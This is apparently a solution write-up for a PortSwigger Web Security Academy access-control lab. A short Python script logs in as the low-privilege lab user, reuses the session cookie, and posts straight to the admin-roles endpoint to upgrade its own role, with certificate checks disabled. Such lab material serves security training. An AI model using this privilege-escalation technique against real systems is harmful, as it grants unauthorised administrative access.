# Lab: Multi-step process with no access control on one step

Link to lab: https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup


url = 'https://0a3600b50475321cc0f1ff2b00f50036.web-security-academy.net/'

# Post login

data = {
    'username': 'wiener',
    'password': 'peter'
}

response = requests.post(
    url + 'login',
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['set-cookie'].split(';')[0].split('=')[1]

# Change role

cookies = {
    'session': session,
}

data = {
    'action': 'upgrade',
    'confirmed': 'true',
    'username': 'wiener',
}

response = requests.post(
    url + 'admin-roles',
    cookies=cookies,
    data=data,
    verify=False,
)

print(response.text)
```